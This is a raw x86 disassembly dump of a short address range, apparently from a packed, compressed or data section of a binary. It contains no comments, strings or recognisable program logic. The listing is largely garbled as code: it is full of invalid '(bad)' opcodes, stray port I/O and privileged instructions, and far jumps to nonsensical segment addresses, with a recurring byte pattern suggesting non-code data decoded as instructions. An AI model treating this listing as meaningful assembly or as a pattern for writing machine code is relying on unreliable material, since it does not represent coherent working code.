  41f641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f642:	mov    ch,0x7b
  41f644:	mov    esp,0xf5000150
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    BYTE PTR [ebp-0x20dbdcf7],dh
  41f651:	dec    esi
  41f652:	lea    esi,[ecx+0x75]
  41f655:	(bad)  
  41f656:	repz mov ebp,0x84f78b05
  41f65c:	adc    eax,0xbe993a33
  41f661:	mov    ebx,edx
  41f663:	into   
  41f664:	or     BYTE PTR [edi+eiz*1-0x6af2dce2],bh
  41f66b:	lds    ebx,FWORD PTR [eax+0x7ea3bc2d]
  41f671:	les    ecx,FWORD PTR [ebp-0x251f8226]
  41f677:	and    edi,esp
  41f679:	ja     0x41f60c
  41f67b:	fdivr  QWORD PTR [eax-0x1d0c43e1]
  41f681:	push   es
  41f682:	aaa    
  41f683:	sahf   
  41f684:	sbb    dl,BYTE PTR [edx-0x2c]
  41f687:	pop    ss
  41f688:	and    bl,bh
  41f68a:	in     al,0x33
  41f68c:	cmp    bl,BYTE PTR [edx+edx*1-0x42d9b8a6]
  41f693:	loop   0x41f6e7
  41f695:	aad    0x46
  41f697:	cmp    dl,BYTE PTR [esp+ecx*1-0x3bf4eb4e]
  41f69e:	jl     0x41f6c5
  41f6a0:	or     al,0x78
  41f6a2:	imul   edx,DWORD PTR ss:[ebx+0x4bfe4a67],0x72635fa0
  41f6ad:	and    DWORD PTR [ebp-0x51],esp
  41f6b0:	mov    al,0x32
  41f6b2:	fs push esp
  41f6b4:	frstor [edi+0x31]
  41f6b7:	aaa    
  41f6b8:	stc    
  41f6b9:	mov    eax,0xb1944a3c
  41f6be:	inc    edx
  41f6bf:	mov    edi,0x2d144176
  41f6c4:	clc    
  41f6c5:	sar    BYTE PTR [ebx-0x46],cl
  41f6c8:	xchg   esi,eax
  41f6c9:	inc    eax
  41f6ca:	loop   0x41f726
  41f6cc:	cmc    
  41f6cd:	call   FWORD PTR [edx-0x7d]
  41f6d0:	and    edi,DWORD PTR [ebx]
  41f6d2:	adc    edi,ebx
  41f6d4:	inc    eax
  41f6d5:	inc    esi
  41f6d6:	out    0x85,al
  41f6d8:	inc    ecx
  41f6d9:	adc    eax,0x77e2dfef
  41f6de:	les    edi,FWORD PTR [ebx+0x4b71e28]
  41f6e4:	mov    edi,0xa1e036db
  41f6e9:	jbe    0x41f763
  41f6eb:	jnp    0x41f706
  41f6ed:	and    ecx,DWORD PTR [eax+0x3444c766]
  41f6f3:	int3   
  41f6f4:	or     bl,BYTE PTR [ecx*2-0x739dff6a]
  41f6fb:	xchg   edx,eax
  41f6fc:	fistp  WORD PTR [ebx-0x306176c5]
  41f702:	cdq    
  41f703:	inc    ecx
  41f704:	sbb    edi,DWORD PTR [eax]
  41f706:	sti    
  41f707:	push   es
  41f708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f709:	clc    
  41f70a:	dec    esp
  41f70b:	dec    edx
  41f70c:	jb     0x41f69c
  41f70e:	jge    0x41f743
  41f710:	std    
  41f711:	xor    edi,DWORD PTR [eax]
  41f713:	mov    ah,0xca
  41f715:	(bad)  
  41f716:	in     al,0xdb
  41f718:	in     al,dx
  41f719:	and    al,0x40
  41f71b:	adc    eax,0x32b4fbc9
  41f720:	push   ecx
  41f721:	or     al,bl
  41f723:	mov    ch,0xd0
  41f725:	hlt    
  41f726:	mov    edi,0x3ae229dd
  41f72b:	sbb    DWORD PTR [ebx],esi
  41f72d:	adc    DWORD PTR [ebp+0x1765890a],ecx
  41f733:	sbb    BYTE PTR [ebx-0x50],0xc3
  41f737:	push   ds
  41f738:	cmp    eax,0x62bae49f
  41f73d:	push   0xffffffa9
  41f73f:	mov    esi,0x12
	...
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	adc    eax,0xb10b1b37
  41f7c5:	push   ecx
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [edx-0x3c7a9a7a],bl
  41f7d1:	sub    ebx,DWORD PTR [edx+0x41310c63]
  41f7d7:	dec    eax
  41f7d8:	cmp    esi,DWORD PTR gs:[edi]
  41f7db:	cli    
  41f7dc:	and    eax,0x4c3d6c2e
  41f7e1:	mov    WORD PTR [ecx+edx*1],gs
  41f7e4:	sar    al,0x81
  41f7e7:	add    DWORD PTR [ebx],ebx
  41f7e9:	or     eax,0x3e51f5ea
  41f7ee:	je     0x41f7dd
  41f7f0:	pop    es
  41f7f1:	jg     0x41f7d6
  41f7f3:	adc    esp,DWORD PTR [edx+esi*8+0x23844499]
  41f7fa:	out    0xbf,al
  41f7fc:	cli    
  41f7fd:	dec    ebp
  41f7fe:	sbb    al,BYTE PTR [edx+ebx*4]
  41f801:	pop    esp
  41f802:	imul   edi,DWORD PTR [edi-0x36e96bba],0xffffffc5
  41f809:	xchg   ebp,eax
  41f80a:	and    DWORD PTR [ebx],ebp
  41f80c:	cmp    dh,BYTE PTR [ebp+0x2e]
  41f80f:	stc    
  41f810:	and    al,0xd4
  41f812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f813:	call   0x29f195a0
  41f818:	inc    ebp
  41f819:	stos   BYTE PTR es:[edi],al
  41f81a:	mov    gs,WORD PTR [edi-0x459dd22d]
  41f820:	mov    bl,0x42
  41f822:	loope  0x41f7e2
  41f824:	jno    0x41f840
  41f826:	rcl    DWORD PTR [ecx+0x1496e63],1
  41f82c:	inc    ecx
  41f82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f82e:	sbb    bh,BYTE PTR [ebp+ebx*8-0x1c]
  41f832:	rcr    DWORD PTR [edx+0x255a1b3a],1
  41f838:	dec    esi
  41f839:	inc    ebp
  41f83a:	leave  
  41f83b:	mov    esp,0xb8efed48
  41f840:	pop    edx
  41f841:	clc    
  41f842:	outs   dx,BYTE PTR ds:[esi]
  41f843:	pop    es
  41f844:	cmc    
  41f845:	popf   
  41f846:	ins    DWORD PTR es:[edi],dx
  41f847:	cld    
  41f848:	pusha  
  41f849:	neg    BYTE PTR [esi+0x0]
  41f84c:	add    dh,dl
  41f84e:	in     al,dx
  41f84f:	imul   edi,DWORD PTR [ebx],0xb69cc583
  41f855:	adc    DWORD PTR ds:0x497ed9cd,edi
  41f85b:	pop    esi
  41f85c:	dec    edi
  41f85d:	sub    DWORD PTR [edi+ecx*8],ebp
  41f860:	mov    eax,0x3a48dbd4
  41f865:	xor    al,0x3e
  41f867:	xor    ah,dl
  41f869:	aad    0x5b
  41f86b:	sub    DWORD PTR [ecx-0x56edc50],0xdcf1d502
  41f875:	cli    
  41f876:	sub    eax,0x59b137ff
  41f87b:	bound  edx,QWORD PTR [edx]
  41f87d:	cmp    eax,0x30f1069f
  41f882:	aam    0x6c
  41f884:	push   edx
  41f885:	xchg   edx,eax
  41f886:	adc    al,0xb8
  41f888:	pop    edx
  41f889:	lock xchg esi,eax
  41f88b:	mov    eax,0x600867bd
  41f890:	jle    0x41f90f
  41f892:	ins    BYTE PTR es:[edi],dx
  41f893:	nop
  41f894:	mov    ah,0x72
  41f896:	mov    dl,BYTE PTR [ebp-0x589cc4ae]
  41f89c:	das    
  41f89d:	xor    al,0x6f
  41f89f:	add    dl,dh
  41f8a1:	mov    al,0xf7
  41f8a3:	mov    al,0xb3
  41f8a5:	mov    cl,0x93
  41f8a7:	dec    esi
  41f8a8:	test   ch,dh
  41f8aa:	(bad)  
  41f8ab:	call   0x64c0115f
  41f8b0:	pushf  
  41f8b1:	push   DWORD PTR [ebp+0x19657d99]
  41f8b7:	(bad)  
  41f8b8:	imul   esi,DWORD PTR [eax+0x6728604b],0x4b7a8d
	...
  41f932:	add    BYTE PTR [eax],al
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x1c9ffef7
  41f941:	inc    edi
  41f942:	loop   0x41f928
  41f944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f945:	push   edx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [ebx-0x7c],bh
  41f94e:	xor    eax,DWORD PTR [eax-0x38d16b19]
  41f954:	mov    dl,0x2
  41f956:	cmp    edi,DWORD PTR [ebx+0x6f]
  41f959:	xchg   edx,eax
  41f95a:	mov    ds:0xe88264a8,eax
  41f95f:	pop    esi
  41f960:	and    al,0x21
  41f962:	jp     0x41f960
  41f964:	sbb    BYTE PTR [edx+0xf660bd4],ah
  41f96a:	mov    edi,0xb4f35fd
  41f96f:	icebp  
  41f970:	push   0x66
  41f972:	mov    BYTE PTR [edx-0x6258860a],0xad
  41f979:	pusha  
  41f97a:	icebp  
  41f97b:	ret    0xe9c8
  41f97e:	test   eax,0x45f6054a
  41f983:	retf   0x482f
  41f986:	dec    ebp
  41f987:	xchg   esi,eax
  41f988:	xor    cl,BYTE PTR [ecx-0x380f4b03]
  41f98e:	test   al,0x3f
  41f990:	inc    esp
  41f991:	jbe    0x41f97b
  41f993:	pop    esp
  41f994:	or     al,0xee
  41f996:	mov    ebp,eax
  41f998:	rcl    BYTE PTR [eax*8+0x1c946fd3],1
  41f99f:	jns    0x41f9fc
  41f9a1:	xchg   edx,eax
  41f9a2:	push   ss
  41f9a3:	dec    edi
  41f9a4:	and    eax,0x57334683
  41f9a9:	mov    ch,0x1f
  41f9ab:	jmp    0xccc8:0x8eb35d42
  41f9b2:	dec    esp
  41f9b3:	and    ch,cl
  41f9b5:	dec    eax
  41f9b6:	aam    0x32
  41f9b8:	xchg   esi,eax
  41f9b9:	or     BYTE PTR [edi],bh
  41f9bb:	xchg   edx,eax
  41f9bc:	xor    BYTE PTR ds:[ebp-0x7d],al
  41f9c0:	ins    DWORD PTR es:[edi],dx
  41f9c1:	cmp    al,0xeb
  41f9c3:	cdq    
  41f9c4:	pop    eax
  41f9c5:	ins    BYTE PTR es:[edi],dx
  41f9c6:	ror    BYTE PTR [edi-0x159ed6a9],0x37
  41f9cd:	loopne 0x41fa36
  41f9cf:	jmp    0xf9b2:0xe6968e06
  41f9d6:	jnp    0x41fa3c
  41f9d8:	cmp    bh,0x13
  41f9db:	inc    edx
  41f9dc:	vandps ymm2,ymm0,YMMWORD PTR [eax+0x10]
  41f9e1:	mov    dl,0x68
  41f9e3:	xor    eax,0x2f186863
  41f9e8:	sbb    ch,BYTE PTR [eax]
  41f9ea:	js     0x41f9bd
  41f9ec:	push   ecx
  41f9ed:	sub    al,0xc5
  41f9ef:	jmp    0x41f9cb
  41f9f1:	imul   ebp,DWORD PTR [esi+0x12],0x5f90ae94
  41f9f8:	add    DWORD PTR [esi],eax
  41f9fa:	lahf   
  41f9fb:	inc    esp
  41f9fc:	mov    esi,0x12ca924c
  41fa01:	push   bx
  41fa03:	sub    BYTE PTR [ecx+0x1e],bl
  41fa06:	(bad)  [eax]
  41fa08:	not    DWORD PTR [ebx+0x1b4478d9]
  41fa0e:	jecxz  0x41fa39
  41fa10:	mov    BYTE PTR [eax+0x3b],bh
  41fa13:	and    al,0xd7
  41fa15:	inc    esi
  41fa16:	sub    ecx,eax
  41fa18:	fisub  WORD PTR [ebp+0x63]
  41fa1b:	aaa    
  41fa1c:	cmp    BYTE PTR [ebx+0x22],0xce
  41fa20:	out    dx,al
  41fa21:	cmp    dl,BYTE PTR [ebx-0x75e26c82]
  41fa27:	int    0xc6
  41fa29:	mov    cl,0x48
  41fa2b:	repnz adc ecx,DWORD PTR [eax-0x704ee02b]
  41fa32:	or     DWORD PTR [ecx-0x7dc1585c],esp
  41fa38:	dec    eax
  41fa39:	sbb    al,0x94
  41fa3b:	adc    eax,DWORD PTR [edx+0x5e0a7458]
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	imul   esp,edi,0xffffffa5
  41fac3:	hlt    
  41fac4:	fwait
  41fac5:	push   ebx
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	cmc    
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    BYTE PTR [ebx-0xa],bl
  41face:	hlt    
  41facf:	sbb    al,bh
  41fad1:	mov    ah,0x71
  41fad3:	scas   eax,DWORD PTR es:[edi]
  41fad4:	dec    edi
  41fad5:	cdq    
  41fad6:	das    
  41fad7:	test   DWORD PTR [edi-0x39585c07],esp
  41fadd:	adc    esi,esp
  41fadf:	xchg   BYTE PTR [edi],cl
  41fae1:	sbb    ch,BYTE PTR [edx-0x2d]
  41fae4:	pusha  
  41fae5:	pop    ecx
  41fae6:	test   esi,ebp
  41fae8:	addr16 mov al,ds:0xfa1d
  41faec:	lock xchg ecx,eax
  41faee:	add    ebp,DWORD PTR es:[ebx+0x67]
  41faf2:	jae    0x41fb1f
  41faf4:	sar    BYTE PTR [esp+esi*2-0x6f22f8d4],0x79
  41fafc:	fwait
  41fafd:	jnp    0x41fb29
  41faff:	out    0x2,al
  41fb01:	inc    esp
  41fb02:	fistp  QWORD PTR [ecx-0x3d96ecf1]
  41fb08:	jmp    0x4298:0x85e2124
  41fb0f:	pop    edi
  41fb10:	sub    al,0x99
  41fb12:	mov    eax,ds:0x3ff42404
  41fb17:	ss jne 0x41fafe
  41fb1a:	enter  0x1485,0x2f
  41fb1e:	jp     0x41fb6e
  41fb20:	mov    ch,0x72
  41fb22:	inc    ebx
  41fb23:	ja     0x41fb72
  41fb25:	and    eax,0xc109fcac
  41fb2a:	mov    esp,0xd59ed627
  41fb2f:	scas   al,BYTE PTR es:[edi]
  41fb30:	div    eax
  41fb32:	mov    ah,0x69
  41fb34:	test   al,0xb6
  41fb36:	or     bl,dl
  41fb38:	loopne 0x41fb18
  41fb3a:	pop    ecx
  41fb3b:	loop   0x41fafa
  41fb3d:	pop    ds
  41fb3e:	dec    edi
  41fb3f:	aas    
  41fb40:	xlat   BYTE PTR ds:[ebx]
  41fb41:	push   edx
  41fb42:	xlat   BYTE PTR ds:[ebx]
  41fb43:	xchg   edx,eax
  41fb44:	or     eax,eax
  41fb46:	mov    ax,cs:0x60d3510b
  41fb4d:	jo     0x41fbc9
  41fb4f:	(bad)  
  41fb50:	rol    ch,1
  41fb52:	mov    WORD PTR [esi-0x2bb1f5ca],fs
  41fb58:	shr    BYTE PTR [ebx+0x1c],0xca
  41fb5c:	adc    DWORD PTR [ebx+eax*8-0x25],edx
  41fb60:	(bad)  
  41fb61:	jbe    0x41fb42
  41fb63:	dec    edx
  41fb64:	mov    ebx,0x65c890fa
  41fb69:	enter  0x9651,0xee
  41fb6d:	pushf  
  41fb6e:	pop    ds
  41fb6f:	std    
  41fb70:	ret    0x7cc2
  41fb73:	xor    DWORD PTR [ebp+0x79],ecx
  41fb76:	fadd   QWORD PTR [ecx+0x5c]
  41fb79:	adc    dh,BYTE PTR [ebp-0x7ca98bd8]
  41fb7f:	nop    DWORD PTR [eax]
  41fb82:	fistp  WORD PTR [ebp-0x32]
  41fb85:	xor    cl,BYTE PTR [esi+0x1cdc9cc]
  41fb8b:	lock jecxz 0x41fbf4
  41fb8e:	xor    BYTE PTR [ecx+ecx*4+0xc],0x56
  41fb93:	push   esi
  41fb94:	mov    edx,0x6be5fe94
  41fb99:	jae    0x41fb57
  41fb9b:	(bad)  
  41fb9c:	icebp  
  41fb9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb9e:	xor    dh,BYTE PTR [esi]
  41fba0:	clc    
  41fba1:	sbb    DWORD PTR ds:0xfaa7aa7e,ecx
  41fba7:	or     edi,DWORD PTR [esi+0xf6c0225]
  41fbad:	pop    ecx
  41fbae:	push   ss
  41fbaf:	arpl   WORD PTR [ebp+0x6d46ee41],si
  41fbb5:	pop    ecx
  41fbb6:	test   eax,0xe8a19834
  41fbbb:	les    edx,FWORD PTR [esi+0x1c]
  41fbbe:	ror    BYTE PTR [esi],0x31
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xc6488ad2
  41fc42:	xchg   di,ax
  41fc44:	nop
  41fc45:	push   esp
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	cmc    
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [ebp+0x43c1aa6c],bh
  41fc51:	jb     0x41fca2
  41fc53:	js     0x41fbf6
  41fc55:	pusha  
  41fc56:	or     al,0x79
  41fc58:	and    ah,BYTE PTR [ebx]
  41fc5a:	retf   0x8834
  41fc5d:	mov    ebp,0x369f7273
  41fc62:	dec    ebp
  41fc63:	je     0x41fc9e
  41fc65:	ds jbe 0x41fc02
  41fc68:	test   DWORD PTR [edi-0xe],ebx
  41fc6b:	adc    BYTE PTR [ecx],0x17
  41fc6e:	jmp    FWORD PTR [edx]
  41fc70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc71:	pusha  
  41fc72:	pop    ebp
  41fc73:	inc    ecx
  41fc74:	or     ah,BYTE PTR [edi+eiz*4+0x5c]
  41fc78:	mov    ah,0x7d
  41fc7a:	loop   0x41fcd3
  41fc7c:	cmp    DWORD PTR [eax],ecx
  41fc7e:	pop    ecx
  41fc7f:	loop   0x41fc03
  41fc81:	jecxz  0x41fced
  41fc83:	std    
  41fc84:	sub    al,0x46
  41fc86:	mov    eax,0x4ba3102e
  41fc8b:	fld    DWORD PTR [edi+0x32]
  41fc8e:	ss inc edi
  41fc90:	ret    0xedb0
  41fc93:	xchg   ebx,eax
  41fc94:	(bad)  
  41fc95:	call   0xf0b5ea44
  41fc9a:	rcr    cl,0x9b
  41fc9d:	ds test eax,0xf2b05292
  41fca3:	mov    edx,0xfbc0832b
  41fca8:	in     al,dx
  41fca9:	add    ecx,edx
  41fcab:	shr    ah,cl
  41fcad:	arpl   ax,bp
  41fcaf:	ret    0x4008
  41fcb2:	sub    al,0xa1
  41fcb4:	mov    eax,ds:0x1e19da5b
  41fcb9:	dec    esi
  41fcba:	mov    dh,BYTE PTR [edx-0x75c897a]
  41fcc0:	push   0xffffff89
  41fcc2:	add    edx,DWORD PTR [esi+0x50]
  41fcc5:	cmp    al,0xde
  41fcc7:	push   ds
  41fcc8:	imul   ebp,eax,0xffffffd8
  41fccb:	cmp    ebx,0xe
  41fcce:	pop    esp
  41fccf:	mov    al,ds:0x96a52c4
  41fcd4:	fistp  QWORD PTR [ecx+0x2c16e2db]
  41fcda:	inc    esp
  41fcdb:	mov    dl,ch
  41fcdd:	push   eax
  41fcde:	sub    eax,0x396c152d
  41fce3:	popa   
  41fce4:	jae    0x41fcb5
  41fce6:	or     dl,ch
  41fce8:	mov    eax,ds:0xb968d7b5
  41fced:	mov    edx,DWORD PTR [eax]
  41fcef:	imul   ebp,DWORD PTR [edi],0xf50074b1
  41fcf5:	or     al,0x6d
  41fcf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcf8:	dec    edi
  41fcf9:	push   es
  41fcfa:	out    0x8b,al
  41fcfc:	mov    DWORD PTR [eax+0x47b04e2d],edx
  41fd02:	and    BYTE PTR [edi+0xf],cl
  41fd05:	push   ebx
  41fd06:	sub    BYTE PTR [edx],0x8b
  41fd09:	adc    eax,0x265ff7b2
  41fd0e:	(bad)  
  41fd0f:	aaa    
  41fd10:	test   ebp,eax
  41fd12:	or     al,0xf4
  41fd14:	test   eax,0xc77876f7
  41fd19:	bnd jl 0x41fd48
  41fd1c:	lahf   
  41fd1d:	cdq    
  41fd1e:	sub    ah,BYTE PTR [eax+0x50]
  41fd21:	xchg   esp,eax
  41fd22:	mov    eax,0x7cc8e663
  41fd27:	and    BYTE PTR [esi-0x34],dl
  41fd2a:	pushf  
  41fd2b:	xchg   ebp,eax
  41fd2c:	xchg   BYTE PTR [edi-0x27e7b10c],cl
  41fd32:	mov    DWORD PTR [edi],edi
  41fd34:	dec    edx
  41fd35:	adc    DWORD PTR [edx],ebp
  41fd37:	ss add edx,ecx
  41fd3a:	mov    DWORD PTR [ebx-0xff12b56],ebp
  41fd40:	mov    edi,0x0
	...
  41fdb1:	add    BYTE PTR [eax],al
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	sbb    DWORD PTR [ecx+esi*1-0x50],ebp
  41fdc4:	test   DWORD PTR [ebp+0x1],edx
  41fdc7:	add    ch,dh
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    BYTE PTR [esp+ecx*1+0x23],bl
  41fdcf:	daa    
  41fdd0:	loopne 0x41fd74
  41fdd2:	xchg   esi,eax
  41fdd3:	sahf   
  41fdd4:	imul   eax,eax,0x2f37107f
  41fdda:	imul   eax,DWORD PTR [eax+0x1a],0x2eec7f93
  41fde1:	ret    
  41fde2:	cmp    eax,0x310f053d
  41fde7:	dec    ecx
  41fde8:	icebp  
  41fde9:	jb     0x41fd9d
  41fdeb:	(bad)  
  41fdec:	enter  0x57cb,0x4b
  41fdf0:	inc    esi
  41fdf1:	sbb    DWORD PTR [ecx+0x44bcc662],eax
  41fdf7:	mov    dl,ch
  41fdf9:	idiv   DWORD PTR [ebp-0x3efc1e98]
  41fdff:	mov    bl,0x57
  41fe01:	mov    ecx,0x4456fdab
  41fe06:	sbb    al,cl
  41fe08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe09:	and    BYTE PTR [ebx],bl
  41fe0b:	sbb    al,0xe8
  41fe0d:	int3   
  41fe0e:	dec    ebp
  41fe0f:	cli    
  41fe10:	jg     0x41fdbb
  41fe12:	sbb    ebp,DWORD PTR [eax]
  41fe14:	aam    0x3c
  41fe16:	push   cs
  41fe17:	mov    eax,ss
  41fe19:	or     BYTE PTR [ebp-0x56],bl
  41fe1c:	fild   QWORD PTR [ecx+0x4a]
  41fe1f:	inc    esp
  41fe20:	jle    0x41fe2e
  41fe22:	jle    0x41fea0
  41fe24:	sbb    BYTE PTR [ebp+0x1b762660],al
  41fe2a:	add    dh,bh
  41fe2c:	ss in  al,0x5f
  41fe2f:	mov    esp,0x4f77cff8
  41fe34:	xor    bh,BYTE PTR [ebx-0xeccd2bd]
  41fe3a:	retf   0x15ff
  41fe3d:	add    ebp,DWORD PTR [eax-0x1beda3ff]
  41fe43:	pop    edx
  41fe44:	rcr    ebx,0x22
  41fe47:	sbb    eax,DWORD PTR [edi+0x23]
  41fe4a:	pop    ebp
  41fe4b:	mov    dh,0xd5
  41fe4d:	(bad)  
  41fe4e:	js     0x41fe72
  41fe50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe51:	jle    0x41fe86
  41fe53:	pop    esp
  41fe54:	xor    BYTE PTR ds:[ecx+0x8b45d00],cl
  41fe5b:	sbb    al,0xdf
  41fe5d:	ja     0x41fe47
  41fe5f:	mov    ?,WORD PTR ds:0x182da240
  41fe65:	push   0xbe9856c4
  41fe6a:	mov    ebp,ebp
  41fe6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe6d:	dec    esi
  41fe6e:	outs   dx,BYTE PTR ds:[esi]
  41fe6f:	mov    es,WORD PTR [ebx]
  41fe71:	dec    esp
  41fe72:	or     edx,DWORD PTR [esi-0x63]
  41fe75:	or     ecx,DWORD PTR [esi+0x28]
  41fe78:	cmc    
  41fe79:	sub    eax,0xb6a3a006
  41fe7e:	add    BYTE PTR [ebx+0x3ff5b73c],dh
  41fe84:	mov    cl,0x64
  41fe86:	aad    0xa5
  41fe88:	mov    dh,0x3b
  41fe8a:	aam    0x7c
  41fe8c:	xor    al,ah
  41fe8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe8f:	xchg   ebp,eax
  41fe90:	je     0x41fed1
  41fe92:	fistp  DWORD PTR [ebx+eiz*2+0x475324ab]
  41fe99:	sub    edx,DWORD PTR [ecx]
  41fe9b:	(bad)  
  41fe9c:	fsubrp st(0),st
  41fe9e:	xor    ebp,DWORD PTR [ebx]
  41fea0:	js     0x41febc
  41fea2:	sar    DWORD PTR [eax+0x39ab38f7],0x3c
  41fea9:	idiv   BYTE PTR [ebx-0x157f0a07]
  41feaf:	pop    esp
  41feb0:	pop    edi
  41feb1:	(bad)  
  41feb2:	cmc    
  41feb3:	pop    esi
  41feb4:	out    dx,eax
  41feb5:	imul   ecx,DWORD PTR [ebp-0x72],0xffffffa0
  41feb9:	push   ss
  41feba:	in     al,dx
  41febb:	jo     0x41fee5
  41febd:	dec    edi
  41febe:	scas   al,BYTE PTR es:[edi]
  41febf:	pusha  
  41fec0:	push   ecx
	...
  41ff31:	add    BYTE PTR [eax],al
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x7969ce39],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    BYTE PTR [eax],dl
  41ff4d:	xor    eax,0x2a01309e
  41ff52:	std    
  41ff53:	iret   
  41ff54:	das    
  41ff55:	lods   eax,DWORD PTR ds:[esi]
  41ff56:	jmp    0x2c560df3
  41ff5b:	fisubr WORD PTR [ebx]
  41ff5d:	or     edx,edx
  41ff5f:	pop    esp
  41ff60:	push   es
  41ff61:	out    0xdc,eax
  41ff63:	clc    
  41ff64:	mov    esi,0xee3ab3b2
  41ff69:	test   al,0x2e
  41ff6b:	mov    ebp,0x6cca1c95
  41ff70:	jmp    0x80c47166
  41ff75:	dec    esi
  41ff76:	fst    DWORD PTR ss:[edi]
  41ff79:	imul   ebx,eax,0xf2b9f1ff
  41ff7f:	cmc    
  41ff80:	js     0x6fedc02d
  41ff86:	sub    edx,DWORD PTR ss:[ecx+0x333fa76]
  41ff8d:	call   0x5f8c:0x65ffa4c4
  41ff94:	mov    ds:0xbf2385e0,eax
  41ff99:	inc    ebp
  41ff9a:	or     esp,esp
  41ff9c:	sub    bl,cl
  41ff9e:	ret    
  41ff9f:	in     al,0xf9
  41ffa1:	push   eax
  41ffa2:	iret   
  41ffa3:	pop    es
  41ffa4:	sbb    eax,0xd554eb01
  41ffa9:	and    al,0x87
  41ffab:	sub    al,0xf1
  41ffad:	(bad)  
  41ffae:	imul   dl
  41ffb0:	xor    eax,0x43625726
  41ffb5:	sbb    eax,0xd3476338
  41ffba:	jmp    0x62dc3074
  41ffbf:	call   0x6723:0x7ac6e99a
  41ffc6:	mov    dh,0x30
  41ffc8:	out    dx,al
  41ffc9:	mov    ebx,DWORD PTR [ebp-0x1639018e]
  41ffcf:	faddp  st(1),st
  41ffd1:	add    edi,DWORD PTR [esi+edi*4]
  41ffd4:	jmp    0x420030
  41ffd6:	xchg   BYTE PTR [esi],ah
  41ffd8:	push   ebx
  41ffd9:	pop    eax
  41ffda:	lock jl 0x41ff66
  41ffdd:	lea    edx,gs:[ecx]
  41ffe0:	icebp  
  41ffe1:	retf   
  41ffe2:	sbb    bh,dh
  41ffe4:	mov    al,ds:0xe911178c
  41ffe9:	adc    edx,DWORD PTR [ebx]
  41ffeb:	xor    al,0x1a
  41ffed:	jl     0x420014
  41ffef:	in     eax,dx
  41fff0:	sub    DWORD PTR [eax-0x3a87a65],esi
  41fff6:	and    eax,0x8d58b158
  41fffb:	xor    eax,0xe12d48c2
  420000:	rcr    dh,1
  420002:	pop    edi
  420003:	fcmovu st,st(5)
  420005:	or     al,BYTE PTR es:[ebx-0x61136fc9]
  42000c:	adc    eax,0x865c1cb7
  420011:	sbb    DWORD PTR [esi],eax
  420013:	pop    edx
  420014:	mov    esp,0x76794df0
  420019:	and    ecx,edx
  42001b:	jae    0x41ffc9
  42001d:	leave  
  42001e:	mov    al,ds:0x6c4f84de
  420023:	add    dl,BYTE PTR [ebx-0x1df807cf]
  420029:	enter  0x774,0x5a
  42002d:	push   eax
  42002e:	sub    al,0xee
  420030:	sbb    edx,edx
  420032:	push   0x3330ec1f
  420037:	push   ecx
  420038:	inc    edx
  420039:	mov    esi,DWORD PTR [eax+0x7bec47e5]
  42003f:	fs mov dl,0x0
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax+0x2008a49e],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    BYTE PTR [ebp+0x5bdd97bd],cl
  4200d1:	mov    ah,0x43
  4200d3:	aad    0x6a
  4200d5:	or     esp,ebx
  4200d7:	mov    dl,0xdb
  4200d9:	and    al,0x2f
  4200db:	daa    
  4200dc:	rcr    BYTE PTR [ebp-0x67447930],0x92
  4200e3:	pop    es
  4200e4:	repnz test DWORD PTR [ebp-0x76b0a2ba],0x73610ebd
  4200ef:	or     cl,cl
  4200f1:	(bad)  
  4200f2:	clc    
  4200f3:	xor    DWORD PTR [esi+0x37],0x593d877
  4200fa:	fnstenv [ecx]
  4200fc:	mov    esi,0xd734d773
